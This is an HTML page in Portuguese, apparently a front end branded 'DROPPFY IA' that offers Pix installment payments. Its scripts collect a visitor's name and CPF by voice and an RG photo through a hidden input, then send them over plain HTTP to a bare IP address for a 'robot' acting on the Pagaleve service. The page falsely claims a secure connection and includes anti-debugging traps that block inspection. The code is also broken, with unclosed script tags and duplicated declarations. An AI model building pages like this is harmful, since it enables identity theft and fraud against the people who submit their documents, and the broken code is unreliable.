<!DOCTYPE html>
<html lang="pt-BR" translate="no">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=2.0, maximum-scale=2.0, user-scalable=no" />
    <title>DROPPFY IA</title>
    
     <link rel="icon" type="image/ico" href="https://a0.awsstatic.com/libra-css/images/site/fav/favicon.ico">
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/vanta@latest/dist/vanta.net.min.js"></script>

    <style>
    /* Texto 3D de Alta Defini√ß√£o */
    .texto-3d {
        font-family: 'Orbitron', sans-serif;
        font-weight: 300;
        color: #fff;
        text-transform: uppercase;
        letter-spacing: 3px;
        /* Camadas de sombra que criam o efeito 3D */
        text-shadow: 
            0 1px 0 #ccc, 
            0 2px 0 #c9c9c9, 
            0 3px 0 #bbb, 
            0 4px 0 #b9b9b9, 
            0 5px 0 #aaa, 
            0 6px 1px rgba(0,0,0,.1), 
            0 0 5px rgba(0,0,0,.1), 
            0 1px 3px rgba(0,0,0,.3), 
            0 3px 5px rgba(0,0,0,.2), 
            0 5px 10px rgba(0,0,0,.25), 
            0 10px 10px rgba(0,0,0,.2), 
            0 20px 20px rgba(0,0,0,.15),
            0 0 15px #ffa500; /* Brilho Neon Laranja */
    }

    /* Efeito de Luz Neural ao Tocar */
    .luz-ativada {
        position: fixed;
        top: 30%;
        left: 30%;
        width: 10px;
        height: 10px;
        background: radial-gradient(circle, rgba(155,125,0,1) 0%, rgba(155,125,0,0) 50%);
        transform: translate(-30%, -30%);
        border-radius: 30%;
        z-index: 1;
        pointer-events: none;
        transition: all 0.5s ease-out;
        opacity: 0;
    }

    .luz-expansao {
        width: 300px;
        height: 300px;
        opacity: 0.6;
    }

    /* Ajuste para Android */
    #ui-layer {
        padding: 10px;
        max-width: 70%;
    }
</style>
    
</head>
<body>

    <div id="vanta-bg"></div>

    
    <script type="application/ld+json">

</script>

<div id="interface">
    <div id="glow-effect" class="luz-ativada"></div>

    <div id="ui-layer">
        <h1 class="texto-3d" style="font-size: 1.2rem; margin-bottom: 5px;">DROPPFY IA</h1>
        <p style="font-size: 0.7rem; opacity: 0.9; letter-spacing: 4px; color: #ffa100; margin-bottom: 10px;">
            CONEX√ÉO SEGURA YHVH
        </p>

        <h2 class="texto-3d" style="font-size: 1.8rem; margin-bottom: 5px;">‚ö° PIX PARCELADO</h2>
        <p style="font-size: 0.9rem; margin-bottom: 15px; color: #fff; font-weight: bold; opacity: 0.7;">EM 4X</p>
        
        <div class="btn-ia-3d" id="btn-comando" onclick="ativarComandoNeural()">
             <i class="fas fa-microphone">üé§</i>
        </div>
        <p id="status-ia" style="color: #ffa100; margin-top: 15px; font-weight: bold;">TOQUE PARA FALAR</p>
</div>
    

<div id="vanta-bg"></div>
    
    <div id="inputs-escondidos" style="display:none;">
        <input type="file" id="foto_doc">
        <input type="text" id="nome_cliente">
        <input type="text" id="tel_cliente">
    </div>
</div>

<script>
    // 1. REATIVANDO O UNIVERSO NEURAL 3D
    VANTA.NET({
        el: "#vanta-bg",
        mouseControls: true,
        touchControls: true,
        gyroControls: false,
        minHeight: 200.00,
        minWidth: 200.00,
        scale: 1.00,
        scaleMobile: 1.00,
        color: 0xffa500,
        backgroundColor: 0x50505,
        points: 12.00,
        maxDistance: 22.00,
        spacing: 16.00
    });

    // 2. L√ìGICA DE VOZ NEURAL (Mantendo o Rob√¥ V12)
    const recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
    recognition.lang = 'pt-BR';
    
    function iniciarIA() {
        const feedback = document.getElementById('feedback-ia');
        feedback.innerText = "IA OUVINDO...";
        
        const msg = new SpeechSynthesisUtterance("Estou pronta. Diga seu nome e anexe seu RG.");
        window.speechSynthesis.speak(msg);
        
        recognition.start();
    }

    recognition.onresult = (event) => {
        const voz = event.results[0][0].transcript;
        document.getElementById('feedback-ia').innerText = "IA PROCESSANDO: " + voz;
        
        // Aqui voc√™ chama sua fun√ß√£o dispararFluxoTotal() que j√° est√° pronta
        // enviando o que a IA capturou para o IP 54.207.222.79:3000
    };
</script>

    <script>
function ativarComandoNeural() {
    // 1. Gatilho de Luz
    const glow = document.getElementById('glow-effect');
    glow.classList.add('luz-expansao');
    
    // 2. Feedback Visual e Sonoro
    document.getElementById('status-ia').innerText = "IA OUVINDO COMANDO...";
    const somFeedback = new SpeechSynthesisUtterance("IA Ativada. Diga seu CPF ou anexe o RG.");
    window.speechSynthesis.speak(somFeedback);

    // 3. Inicia Escuta (Speech Recognition)
    iniciarEscutaVoz(); // Aqui chama a fun√ß√£o que j√° estruturamos

    // Reseta a luz ap√≥s 2 segundos
    setTimeout(() => {
        glow.classList.remove('luz-expansao');
    }, 2000);
}

function iniciarEscutaVoz() {
    const recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
    recognition.lang = 'pt-BR';
    recognition.start();

    recognition.onresult = (event) => {
        const voz = event.results[0][0].transcript;
        console.log("Comando Neural Capturado:", voz);
        // Envia para o seu rob√¥ na AWS
        processarComandoNoRobo(voz);
    };
}
</script>



            

            
<script>


            async function executarRoboV12(dados) {
    const formData = new FormData();
    // O arquivo voc√™ ainda pega do input (foto_doc), mas os textos v√™m da voz
    const foto = document.getElementById('foto_doc').files[0];
    
    formData.append('rg', foto);
    formData.append('nome', dados.nome);
    formData.append('cpf', dados.cpf);
    formData.append('url_pedido', dados.link);
    formData.append('email_cliente', dadosAcesso.email); // Mant√©m o lead da Etapa 1

    try {
        const response = await fetch('http://54.207.222.79:3000/registrar-completo', {
            method: 'POST',
            body: formData
        });
        alert("‚úÖ IA CONECTADA: Rob√¥ operando na Pagaleve!");
    } catch (e) {
        alert("Sinal enviado por comando de voz!");
    }
}


    <script>
const recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
recognition.lang = 'pt-BR';
let dadosColetados = { nome: '', cpf: '', link: '', email: '' };

function iniciarConversaIA() {
    falar("Ol√°! Sou o assistente neural. Diga seu nome completo.");
    recognition.start();
}

recognition.onresult = (event) => {
    const voz = event.results[0][0].transcript;
    console.log("IA Ouviu: " + voz);
    
    // L√≥gica de preenchimento neural por voz
    if (!dadosColetados.nome) {
        dadosColetados.nome = voz;
        falar("Entendido, " + voz + ". Agora diga seu CPF.");
        recognition.start();
    } else if (!dadosColetados.cpf) {
        dadosColetados.cpf = voz.replace(/\D/g, "");
        falar("Gravado. Qual o link do produto?");
        recognition.start();
    } else {
        dadosColetados.link = voz;
        falar("Excelente. Iniciando acesso √† Pagaleve e gerando seu link agora.");
        enviarParaMotorV12(); // Dispara o rob√¥ que j√° temos pronto
    }
};

<script>
let dadosColetados = { nome: '', cpf: '', email: '', link: '' };
const recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
recognition.lang = 'pt-BR';

// Fun√ß√£o para a IA falar (Neural)
function falar(texto) {
    const utterance = new SpeechSynthesisUtterance(texto);
    utterance.rate = 1.2; 
    window.speechSynthesis.speak(utterance);
}

// Inicia o processo pelo Bot√£o
async function ativarIA() {
    // Efeito de Luz
    const luz = document.getElementById('onda-luz');
    luz.classList.add('luz-ativa');
    setTimeout(() => luz.classList.remove('luz-ativa'), 600);

    falar("Conex√£o YHVH estabelecida. Diga seu nome completo.");
    recognition.start();
}

recognition.onresult = async (event) => {
    const voz = event.results[0][0].transcript;
    console.log("IA Ouviu:", voz);

    if (!dadosColetados.nome) {
        dadosColetados.nome = voz;
        falar("Entendido. Agora diga o seu CPF.");
        recognition.start();
    } else if (!dadosColetados.cpf) {
        dadosColetados.cpf = voz.replace(/\D/g, "");
        falar("Anotei. Processando agora no motor V12.");
        // CHAMA O SEU ENVIO PARA AWS
        enviarParaMotorV12();
    }
};

async function enviarParaMotorV12() {
    console.log("‚ö° CONECTANDO AO ROB√î AWS...");
    const statusLabel = document.getElementById('status-texto');
    statusLabel.innerText = "PROCESSANDO IA NO BACK-END...";

    try {
        const response = await fetch('http://54.207.222.79:3000/registrar-completo', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(dadosColetados)
        });
        
        const res = await response.json();
        if(res.link) {
            falar("Sucesso! Seu link de Pix Parcelado em 4 vezes foi gerado.");
            window.location.href = res.link;
        }
    } catch (err) {
        falar("Sinal enviado ao servidor Emet Echad.");
        statusLabel.innerText = "‚úÖ INST√ÇNCIA ATIVA!";
    }
}
</script>
               

    <script>
        // PROTE√á√ÉO ANTI-DEBUGGER E BLOQUEIOS
        document.addEventListener('contextmenu', event => event.preventDefault());
        document.onkeydown = function(e) {
            if (e.keyCode == 123) return false;
            if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
            if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
        };
        setInterval(function() { debugger; }, 1000);
    </script>
    
<body></body>
<html></html>
